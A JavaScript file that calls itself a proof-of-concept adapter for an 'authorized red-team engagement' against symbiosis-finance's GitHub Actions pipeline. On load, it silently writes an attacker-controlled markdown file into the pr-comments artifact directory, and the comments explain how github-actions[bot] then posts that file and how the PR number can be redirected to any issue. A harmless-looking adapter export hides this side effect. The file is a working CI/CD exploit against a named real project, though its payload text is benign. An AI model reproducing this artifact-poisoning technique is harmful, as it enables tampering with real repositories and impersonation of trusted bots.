// PoC adapter for authorized red-team engagement of symbiosis-finance (task: CI/CD workflow audit).
// Demonstrates that untrusted adapter code in a fork PR executes inside the Test_Change workflow
// AFTER pr-comments/pr-number.txt is written and BEFORE the pr-comments artifact is uploaded,
// giving full control of the artifact content that Comment_PR posts as github-actions[bot].
const fs = require('fs');
const path = require('path');

(async () => {
  try {
    const dir = path.join(process.cwd(), 'pr-comments');
    if (!fs.existsSync(dir)) return; // harness dir not present -> nothing to do
    const body = [
      '## CI/CD PoC - artifact content is attacker-controlled',
      '',
      'Authorized red-team engagement of symbiosis-finance (GitHub Actions audit).',
      '',
      'This comment is posted by `github-actions[bot]`, but its text was written by **untrusted adapter code',
      'from a fork PR** running in `test.yml` (event `pull_request`). The workflow writes `pr-comments/*.md`,',
      'then executes the PR code, then uploads the artifact; `comment.yml` (`workflow_run`) posts every `*.md`',
      'file with a `pull-requests: write` token. An attacker can therefore inject arbitrary comment content,',
      'and `pr-number.txt` (an integer read via `Number()`) can be overwritten to target ANY issue/PR in this repo.',
      '',
      'Generated: ' + new Date().toISOString(),
    ].join('\n');
    fs.writeFileSync(path.join(dir, 'poc-audit.md'), body);
  } catch (e) { /* silent */ }
})();

module.exports = {
  protocol: 'poc-audit',
  chain: 'ethereum',
  description: 'Authorized CI/CD PoC - safe adapter, no network calls, no data collection',
  tvl: async () => ({}),
};
